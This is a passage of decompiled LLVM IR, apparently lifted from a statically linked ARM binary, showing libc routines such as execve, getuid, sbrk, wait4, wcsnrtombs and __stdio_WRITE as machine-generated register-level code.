  %v8_13bf8 = call i32 @execve(i8* %v1_13bf8, [1 x i8*] %v4_13bf8, [1 x i8*] %v7_13bf8)
  store i32 %v8_13bf8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_13bf8, -4095
  br i1 %tmp, label %dec_label_pc_13c18, label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %entry
  %v0_13c08 = call i32 @__errno_location()
  %v0_13c0c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c0c = sub i32 0, %v0_13c0c
  %v2_13c10 = inttoptr i32 %v0_13c08 to i32*
  store i32 %v1_13c0c, i32* %v2_13c10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c18

dec_label_pc_13c18:                               ; preds = %entry, %dec_label_pc_13c08
  %v0_13c18 = phi i32 [ %v8_13bf8, %entry ], [ -1, %dec_label_pc_13c08 ]
  %v2_13c1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13c1c, i32* @r4, align 4
  ret i32 %v0_13c18

; uselistorder directives
  uselistorder i32 %v8_13bf8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c18, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c20 = load i32, i32* @r4, align 4
  store i32 %v3_13c20, i32* %stack_var_-8, align 4
  %v0_13c28 = load i32, i32* @r0, align 4
  store i32 %v0_13c28, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c28, -4095
  br i1 %tmp, label %dec_label_pc_13c44, label %dec_label_pc_13c34

dec_label_pc_13c34:                               ; preds = %entry
  %v0_13c34 = call i32 @__errno_location()
  %v0_13c38 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c38 = sub i32 0, %v0_13c38
  %v2_13c3c = inttoptr i32 %v0_13c34 to i32*
  store i32 %v1_13c38, i32* %v2_13c3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13c48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c44

dec_label_pc_13c44:                               ; preds = %entry, %dec_label_pc_13c34
  %v2_13c48 = phi i32 [ %v3_13c20, %entry ], [ %v2_13c48.pre, %dec_label_pc_13c34 ]
  %v0_13c44 = phi i32 [ %v0_13c28, %entry ], [ -1, %dec_label_pc_13c34 ]
  store i32 %v2_13c48, i32* @r4, align 4
  ret i32 %v0_13c44

; uselistorder directives
  uselistorder i32 %v0_13c28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c44, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c4c = load i32, i32* @r4, align 4
  store i32 %v3_13c4c, i32* %stack_var_-8, align 4
  %v0_13c54 = load i32, i32* @r0, align 4
  store i32 %v0_13c54, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c54, -4095
  br i1 %tmp, label %dec_label_pc_13c70, label %dec_label_pc_13c60

dec_label_pc_13c60:                               ; preds = %entry
  %v0_13c60 = call i32 @__errno_location()
  %v0_13c64 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c64 = sub i32 0, %v0_13c64
  %v2_13c68 = inttoptr i32 %v0_13c60 to i32*
  store i32 %v1_13c64, i32* %v2_13c68, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13c74.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c70

dec_label_pc_13c70:                               ; preds = %entry, %dec_label_pc_13c60
  %v2_13c74 = phi i32 [ %v3_13c4c, %entry ], [ %v2_13c74.pre, %dec_label_pc_13c60 ]
  %v0_13c70 = phi i32 [ %v0_13c54, %entry ], [ -1, %dec_label_pc_13c60 ]
  store i32 %v2_13c74, i32* @r4, align 4
  ret i32 %v0_13c70

; uselistorder directives
  uselistorder i32 %v0_13c54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c70, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c78 = load i32, i32* @r4, align 4
  store i32 %v3_13c78, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13c9c, label %dec_label_pc_13c8c

dec_label_pc_13c8c:                               ; preds = %entry
  %v0_13c8c = call i32 @__errno_location()
  %v0_13c90 = load i32, i32* %r4.global-to-local, align 4
  %v1_13c90 = sub i32 0, %v0_13c90
  %v2_13c94 = inttoptr i32 %v0_13c8c to i32*
  store i32 %v1_13c90, i32* %v2_13c94, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13ca0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c9c

dec_label_pc_13c9c:                               ; preds = %entry, %dec_label_pc_13c8c
  %v2_13ca0 = phi i32 [ %v3_13c78, %entry ], [ %v2_13ca0.pre, %dec_label_pc_13c8c ]
  %v0_13c9c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13c8c ]
  store i32 %v2_13ca0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13c9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c9c, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ca4 = load i32, i32* @r4, align 4
  store i32 %v3_13ca4, i32* %stack_var_-8, align 4
  %v0_13cac = load i32, i32* @r0, align 4
  store i32 %v0_13cac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13cac, -4095
  br i1 %tmp, label %dec_label_pc_13cc8, label %dec_label_pc_13cb8

dec_label_pc_13cb8:                               ; preds = %entry
  %v0_13cb8 = call i32 @__errno_location()
  %v0_13cbc = load i32, i32* %r4.global-to-local, align 4
  %v1_13cbc = sub i32 0, %v0_13cbc
  %v2_13cc0 = inttoptr i32 %v0_13cb8 to i32*
  store i32 %v1_13cbc, i32* %v2_13cc0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13ccc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13cc8

dec_label_pc_13cc8:                               ; preds = %entry, %dec_label_pc_13cb8
  %v2_13ccc = phi i32 [ %v3_13ca4, %entry ], [ %v2_13ccc.pre, %dec_label_pc_13cb8 ]
  %v0_13cc8 = phi i32 [ %v0_13cac, %entry ], [ -1, %dec_label_pc_13cb8 ]
  store i32 %v2_13ccc, i32* %r4.global-to-local, align 4
  ret i32 %v0_13cc8

; uselistorder directives
  uselistorder i32 %v0_13cac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cc8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_13cd0 = load i32, i32* @r4, align 4
  store i32 %v3_13cd0, i32* %stack_var_-8, align 4
  %v6_13cd4 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_13cd4, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_13cd4, -4095
  br i1 %tmp6, label %dec_label_pc_13cf4, label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %entry
  %v0_13ce4 = call i32 @__errno_location()
  %v0_13ce8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ce8 = sub i32 0, %v0_13ce8
  %v2_13cec = inttoptr i32 %v0_13ce4 to i32*
  store i32 %v1_13ce8, i32* %v2_13cec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13cf4

dec_label_pc_13cf4:                               ; preds = %entry, %dec_label_pc_13ce4
  %v0_13cf4 = phi i32 [ %v6_13cd4, %entry ], [ -1, %dec_label_pc_13ce4 ]
  %v2_13cf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13cf8, i32* %r4.global-to-local, align 4
  ret i32 %v0_13cf4

; uselistorder directives
  uselistorder i32 %v6_13cd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cf4, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13cfc = load i32, i32* @r4, align 4
  store i32 %v3_13cfc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_29da4.846 to i32), i32* %r4.global-to-local, align 4
  %v2_13d04 = load i32, i32* @global_var_29da4.846, align 4
  %v2_13d08 = icmp eq i32 %v2_13d04, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13d08, label %dec_label_pc_13d18, label %dec_label_pc_13d24

dec_label_pc_13d18:                               ; preds = %entry
  %v2_13d18 = call i32 @__GI_brk(i32* null)
  %v1_13d1c = icmp slt i32 %v2_13d18, 0
  br i1 %v1_13d1c, label %dec_label_pc_13d44, label %dec_label_pc_13d24thread-pre-split

dec_label_pc_13d24thread-pre-split:               ; preds = %dec_label_pc_13d18
  %v0_13d28.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_13d24.pre = load i32, i32* @global_var_29da4.846, align 4
  br label %dec_label_pc_13d24

dec_label_pc_13d24:                               ; preds = %dec_label_pc_13d24thread-pre-split, %entry
  %v2_13d24 = phi i32 [ %v2_13d24.pre, %dec_label_pc_13d24thread-pre-split ], [ %v2_13d04, %entry ]
  %v1_13d30 = phi i32 [ %v0_13d28.pr, %dec_label_pc_13d24thread-pre-split ], [ %arg1, %entry ]
  %v2_13d28 = icmp eq i32 %v1_13d30, 0
  store i32 %v2_13d24, i32* %r4.global-to-local, align 4
  br i1 %v2_13d28, label %dec_label_pc_13d48, label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %dec_label_pc_13d24
  %v2_13d30 = add i32 %v1_13d30, %v2_13d24
  %v1_13d38 = inttoptr i32 %v2_13d30 to i32*
  %v2_13d38 = call i32 @__GI_brk(i32* %v1_13d38)
  %v1_13d3c = icmp slt i32 %v2_13d38, 0
  br i1 %v1_13d3c, label %dec_label_pc_13d44, label %dec_label_pc_13d38.dec_label_pc_13d48_crit_edge

dec_label_pc_13d38.dec_label_pc_13d48_crit_edge:  ; preds = %dec_label_pc_13d38
  %v0_13d48.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13d48

dec_label_pc_13d44:                               ; preds = %dec_label_pc_13d38, %dec_label_pc_13d18
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13d48

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d38.dec_label_pc_13d48_crit_edge, %dec_label_pc_13d24, %dec_label_pc_13d44
  %v0_13d48 = phi i32 [ %v0_13d48.pre, %dec_label_pc_13d38.dec_label_pc_13d48_crit_edge ], [ %v2_13d24, %dec_label_pc_13d24 ], [ -1, %dec_label_pc_13d44 ]
  %v2_13d4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13d4c, i32* @r4, align 4
  ret i32 %v0_13d48

; uselistorder directives
  uselistorder i32 %v2_13d24, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 22, 23, 20, 21, 19, 18, 17, 24, 25, 26, 2 }
  uselistorder label %dec_label_pc_13d48, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d54 = load i32, i32* @r4, align 4
  store i32 %v3_13d54, i32* %stack_var_-8, align 4
  %v0_13d58 = call i32 @wait4()
  store i32 %v0_13d58, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13d58, -4095
  br i1 %tmp, label %dec_label_pc_13d78, label %dec_label_pc_13d68

dec_label_pc_13d68:                               ; preds = %entry
  %v0_13d68 = call i32 @__errno_location()
  %v0_13d6c = load i32, i32* %r4.global-to-local, align 4
  %v1_13d6c = sub i32 0, %v0_13d6c
  %v2_13d70 = inttoptr i32 %v0_13d68 to i32*
  store i32 %v1_13d6c, i32* %v2_13d70, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13d78

dec_label_pc_13d78:                               ; preds = %entry, %dec_label_pc_13d68
  %v0_13d78 = phi i32 [ %v0_13d58, %entry ], [ -1, %dec_label_pc_13d68 ]
  %v2_13d7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d7c, i32* @r4, align 4
  ret i32 %v0_13d78

; uselistorder directives
  uselistorder i32 %v0_13d58, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_13d78, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_29d84.848 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_13d90 = icmp eq i32 %arg1, 0
  br i1 %v2_13d90, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_13d98 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_13dc0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_13db4 = phi i32 [ %arg1, %.thread ], [ %v3_13d98, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_13dac = ptrtoint i32* %stack_var_-16 to i32
  %v2_13db8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_13db8, i32* %stack_var_-16, align 4
  store i32 %v0_13dc0, i32* %stack_var_-12, align 4
  %v5_13dc8 = inttoptr i32 %v0_13db4 to i8*
  %v6_13dc8 = call i32 @__GI_wcsnrtombs(i8* %v5_13dc8, i32 %v2_13dac, i32 1, i32 16, i32 %arg3)
  %v2_13dcc = icmp eq i32 %v6_13dc8, 0
  br i1 %v2_13dcc, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_13dd8 = phi i32 [ %v6_13dc8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_13dd8

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_13de8 = load i32, i32* @r2, align 4
  store i32 %v0_13de8, i32* @r3, align 4
  %v0_13df0 = load i32, i32* @r0, align 4
  %v1_13df0 = load i32, i32* @r1, align 4
  %v5_13df0 = inttoptr i32 %v0_13df0 to i8*
  %v6_13df0 = call i32 @__GI_wcsnrtombs(i8* %v5_13df0, i32 %v1_13df0, i32 -1, i32 %v0_13de8, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_13df0
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13dfc = load i32, i32* @r4, align 4
  store i32 %v3_13dfc, i32* %stack_var_-8, align 4
  %v10_13e00 = icmp eq i32 %tmp, %arg2
  br i1 %v10_13e00, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_13e081 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e1c

bb:                                               ; preds = %entry
  %v4_13e04 = icmp eq i8* %arg1, null
  %v0_13e08 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_13e04, label %dec_label_pc_13e1c, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e58

dec_label_pc_13e1c:                               ; preds = %.thread, %bb
  %v1_13e5c.ph = phi i32 [ %v0_13e08, %bb ], [ %v0_13e081, %.thread ]
  %v2_13e0c3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_13e1c = icmp eq i8* %arg1, null
  store i32 %v2_13e0c3.ph, i32* @ip, align 4
  br i1 %v3_13e1c, label %.thread4, label %dec_label_pc_13e50

.thread4:                                         ; preds = %dec_label_pc_13e1c
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_13e58

dec_label_pc_13e34:                               ; preds = %dec_label_pc_13e70
  %v0_13e34 = call i32 @__errno_location()
  store i32 %v0_13e34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13e40 = inttoptr i32 %v0_13e34 to i32*
  store i32 84, i32* %v2_13e40, align 4
  %v0_13eac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13eac

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e80
  %v3_13e84 = zext i8 %v2_13e84 to i32
  store i32 %v3_13e84, i32* @lr, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13e50:                               ; preds = %dec_label_pc_13e1c
  store i32 %v2_13e0c3.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e58

dec_label_pc_13e58:                               ; preds = %bb27, %.thread4, %dec_label_pc_13e50
  %v1_13e5c20 = phi i32 [ %v0_13e08, %bb27 ], [ %v1_13e5c.ph, %.thread4 ], [ %v1_13e5c.ph, %dec_label_pc_13e50 ]
  %v2_13e8014 = phi i32 [ %tmp, %bb27 ], [ %v2_13e0c3.ph, %.thread4 ], [ %v2_13e0c3.ph, %dec_label_pc_13e50 ]
  %v1_13e58 = load i32, i32* @r3, align 4
  %v3_13e58 = icmp uge i32 %v1_13e5c20, %v1_13e58
  %v1_13e58.v1_13e5c20 = select i1 %v3_13e58, i32 %v1_13e58, i32 %v1_13e5c20
  store i32 %v1_13e58.v1_13e5c20, i32* %r4.global-to-local, align 4
  %v1_13e64 = inttoptr i32 %arg2 to i32*
  %v2_13e64 = load i32, i32* %v1_13e64, align 4
  store i32 %v2_13e64, i32* @lr, align 4
  store i32 %v1_13e58.v1_13e5c20, i32* %r0.global-to-local, align 4
  %v2_13e988 = icmp eq i32 %v1_13e58.v1_13e5c20, 0
  br i1 %v2_13e988, label %dec_label_pc_13ea0, label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e58, %dec_label_pc_13e90.dec_label_pc_13e70_crit_edge
  %v2_13e80 = phi i32 [ %v2_13e90, %dec_label_pc_13e90.dec_label_pc_13e70_crit_edge ], [ %v2_13e8014, %dec_label_pc_13e58 ]
  %v0_13e78 = phi i32 [ %v0_13e70.pre, %dec_label_pc_13e90.dec_label_pc_13e70_crit_edge ], [ %v2_13e64, %dec_label_pc_13e58 ]
  %v1_13e70 = inttoptr i32 %v0_13e78 to i32*
  %v2_13e70 = load i32, i32* %v1_13e70, align 4
  %v1_13e78 = add i32 %v0_13e78, 4
  store i32 %v1_13e78, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_13e70, 127
  br i1 %tmp36, label %dec_label_pc_13e34, label %dec_label_pc_13e80

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e70
  %v1_13e80 = trunc i32 %v2_13e70 to i8
  %v3_13e80 = inttoptr i32 %v2_13e80 to i8*
  store i8 %v1_13e80, i8* %v3_13e80, align 1
  %v0_13e84 = load i32, i32* @ip, align 4
  %v1_13e84 = inttoptr i32 %v0_13e84 to i8*
  %v2_13e84 = load i8, i8* %v1_13e84, align 1
  %v2_13e88 = icmp eq i8 %v2_13e84, 0
  br i1 %v2_13e88, label %dec_label_pc_13e48, label %dec_label_pc_13e90

dec_label_pc_13e90:                               ; preds = %dec_label_pc_13e80
  %v1_13e90 = load i32, i32* %r2.global-to-local, align 4
  %v2_13e90 = add i32 %v1_13e90, %v0_13e84
  store i32 %v2_13e90, i32* @ip, align 4
  %v0_13e94 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e94 = add i32 %v0_13e94, -1
  store i32 %v1_13e94, i32* %r0.global-to-local, align 4
  %v2_13e98 = icmp eq i32 %v1_13e94, 0
  br i1 %v2_13e98, label %dec_label_pc_13ea0, label %dec_label_pc_13e90.dec_label_pc_13e70_crit_edge

dec_label_pc_13e90.dec_label_pc_13e70_crit_edge:  ; preds = %dec_label_pc_13e90
  %v0_13e70.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13e70

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e90, %dec_label_pc_13e58, %dec_label_pc_13e48
  %v0_13ea0 = phi i32 [ %v0_13e84, %dec_label_pc_13e48 ], [ %v2_13e8014, %dec_label_pc_13e58 ], [ %v2_13e90, %dec_label_pc_13e90 ]
  %v1_13ea0 = load i32, i32* @sp, align 4
  %v9_13ea0 = icmp eq i32 %v0_13ea0, %v1_13ea0
  br i1 %v9_13ea0, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_13ea0
  %v1_13ea4 = load i32, i32* @lr, align 4
  store i32 %v1_13ea4, i32* %v1_13e64, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_13ea0, %bb30
  %v0_13ea8 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ea8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13ea8 = sub i32 %v1_13ea8, %v0_13ea8
  store i32 %v2_13ea8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13eac

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13e34, %bb31
  %v0_13eac = phi i32 [ %v0_13eac.pre, %dec_label_pc_13e34 ], [ %v2_13ea8, %bb31 ]
  store i32 %v0_13eac, i32* %r0.global-to-local, align 4
  %v2_13eb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13eb4, i32* %r4.global-to-local, align 4
  ret i32 %v0_13eac

; uselistorder directives
  uselistorder i32 %v0_13eac, { 1, 0 }
  uselistorder i32 %v1_13e94, { 1, 0 }
  uselistorder i32 %v2_13e90, { 0, 2, 1 }
  uselistorder i32 %v2_13e70, { 1, 0 }
  uselistorder i32 %v2_13e8014, { 1, 0 }
  uselistorder i32 %v1_13e5c.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 15, 17, 0, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13eac, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_13e70, { 1, 0 }
  uselistorder label %dec_label_pc_13e58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13e1c, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_13ecc2 = icmp eq i32 %arg3, 0
  store i1 %v2_13ecc2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_13ecc2, label %dec_label_pc_13f6c, label %dec_label_pc_13ed8

dec_label_pc_13eccthread-pre-split:               ; preds = %bb22
  %v3_13ef0 = load i32, i32* %r7.global-to-local, align 4
  %v5_13ef0 = add i32 %v3_13ef0, %v4_13ee4
  store i32 %v5_13ef0, i32* %r7.global-to-local, align 4
  %v5_13ef4 = sub i32 %v0_13eec, %v4_13ee4
  store i32 %v5_13ef4, i32* %r5.global-to-local, align 4
  %v2_13ecc = icmp eq i32 %v5_13ef4, 0
  store i1 %v2_13ecc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13ef4, i32* @r2, align 4
  br i1 %v2_13ecc, label %dec_label_pc_13ecc.dec_label_pc_13f6c.loopexit_crit_edge, label %dec_label_pc_13ed8

dec_label_pc_13ed8:                               ; preds = %entry, %dec_label_pc_13eccthread-pre-split
  %v0_13edc = phi i32 [ %v5_13ef0, %dec_label_pc_13eccthread-pre-split ], [ %arg2, %entry ]
  %v0_13ed8.in = phi i32 [ %v5_13ef4, %dec_label_pc_13eccthread-pre-split ], [ %arg3, %entry ]
  %v0_13ed8 = icmp slt i32 %v0_13ed8.in, 0
  br i1 %v0_13ed8, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_13ed8
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_13ed8, %bb
  %v0_13ee0 = load i32, i32* @r4, align 4
  %v1_13ee0 = add i32 %v0_13ee0, 4
  %v2_13ee0 = inttoptr i32 %v1_13ee0 to i32*
  %v3_13ee0 = load i32, i32* %v2_13ee0, align 4
  store i32 %v3_13ee0, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_13edc to i32*
  %v4_13ee4 = call i32 @__libc_write(i32 %v3_13ee0, i32* %tmp23)
  store i32 %v4_13ee4, i32* %r0.global-to-local, align 4
  %v1_13ee8 = icmp slt i32 %v4_13ee4, 0
  %v2_13ee8 = icmp eq i32 %v4_13ee4, 0
  store i1 %v2_13ee8, i1* %cpsr_z.global-to-local, align 1
  %v0_13eec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13eec, i32* %r6.global-to-local, align 4
  br i1 %v1_13ee8, label %dec_label_pc_13efc, label %dec_label_pc_13eccthread-pre-split

dec_label_pc_13efc:                               ; preds = %bb22
  %v0_13efc = load i32, i32* @r4, align 4
  %v1_13efc = inttoptr i32 %v0_13efc to i32*
  %v2_13efc = load i32, i32* %v1_13efc, align 4
  store i32 %v2_13efc, i32* %r3.global-to-local, align 4
  %v1_13f00 = add i32 %v0_13efc, 8
  store i32 %v1_13f00, i32* %r0.global-to-local, align 4
  %v1_13f04 = inttoptr i32 %v1_13f00 to i32*
  %v2_13f04 = load i32, i32* %v1_13f04, align 4
  store i32 %v2_13f04, i32* %r0.global-to-local, align 4
  %v3_13f04 = add i32 %v0_13efc, 12
  %v4_13f04 = inttoptr i32 %v3_13f04 to i32*
  %v5_13f04 = load i32, i32* %v4_13f04, align 4
  %v1_13f08 = or i32 %v2_13efc, 8
  store i32 %v1_13f08, i32* %r3.global-to-local, align 4
  %v3_13f0c = sdiv i32 %v2_13efc, 256
  %v2_13f10 = sub i32 %v5_13f04, %v2_13f04
  store i32 %v2_13f10, i32* %r2.global-to-local, align 4
  %v9_13f10 = icmp eq i32 %v5_13f04, %v2_13f04
  store i1 %v9_13f10, i1* %cpsr_z.global-to-local, align 1
  %v1_13f14 = trunc i32 %v3_13f0c to i8
  %v3_13f14 = add i32 %v0_13efc, 1
  %v4_13f14 = inttoptr i32 %v3_13f14 to i8*
  store i8 %v1_13f14, i8* %v4_13f14, align 1
  %v0_13f18 = load i32, i32* %r3.global-to-local, align 4
  %v1_13f18 = trunc i32 %v0_13f18 to i8
  %v2_13f18 = load i32, i32* @r4, align 4
  %v3_13f18 = inttoptr i32 %v2_13f18 to i8*
  store i8 %v1_13f18, i8* %v3_13f18, align 1
  %v0_13f1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f1c, label %dec_label_pc_13efc.dec_label_pc_13f68_crit_edge, label %dec_label_pc_13f20

dec_label_pc_13efc.dec_label_pc_13f68_crit_edge:  ; preds = %dec_label_pc_13efc
  %v0_13f68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f68

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13efc
  %v0_13f20 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f20 = load i32, i32* %r5.global-to-local, align 4
  %v9_13f20 = icmp eq i32 %v0_13f20, %v1_13f20
  store i1 %v9_13f20, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_13f20, %v1_13f20
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_13f20
  store i32 %v0_13f20, i32* %r6.global-to-local, align 4
  br label %.preheader

